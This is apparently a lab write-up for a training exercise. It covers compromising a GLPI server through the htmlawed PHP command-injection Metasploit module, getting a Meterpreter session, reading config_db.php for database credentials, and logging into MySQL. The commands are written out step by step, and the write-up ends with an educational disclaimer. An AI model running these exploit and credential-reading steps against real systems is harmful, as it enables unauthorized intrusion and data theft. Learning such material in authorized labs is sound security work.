🔍 Enumeration
A service scan against the target system revealed the following services:
80/tcp – HTTP (Apache)
3306/tcp – MySQL (MariaDB)
The web service was identified as running GLPI, an IT asset management application.
🎯 Vulnerability Research
Metasploit Framework was used to search for known vulnerabilities related to GLPI:
search glpi
The following exploit published in 2022 was identified:
exploit/linux/http/glpi_htmlawed_php_injection
This exploit abuses a PHP Command Injection vulnerability in the htmlawed plugin component of GLPI.
⚙️ Exploit Configuration
After selecting the exploit, the target and attacker machine settings were configured:
RHOSTS (Remote Target): energysolutions.hv
LHOST (Local Attacker): HackerBox IP address
use exploit/linux/http/glpi_htmlawed_php_injection
set RHOSTS energysolutions.hv
set LHOST 172.20.5.113
exploit
🐚 Initial Access
The exploit executed successfully and a Meterpreter session was obtained on the target system.
Due to the exploited plugin, initial access was gained from the following directory:
/var/www/html/glpi/vendor/htmlawed/htmlawed
📁 Accessing Sensitive Files
By navigating to the GLPI configuration directory, sensitive database information was retrieved:
cd /var/www/html/glpi/config
ls
cat config_db.php
The following critical credentials were identified:
Database User: glpiuser
Database Password: glpi-password
Database Name: glpi
🗄️ Database Access
Using the obtained credentials, access to the MySQL database was achieved:
mysql -u glpiuser -p
This allowed interaction with GLPI database tables and user records.
✅ Conclusion
During this lab:
A Remote Code Execution vulnerability in GLPI was successfully exploited
Unauthorized command execution was achieved on the target system
Sensitive configuration files were accessed, leading to database compromise
⚠️ Disclaimer
This work was performed strictly for educational purposes
All activities were conducted in authorized lab environments only
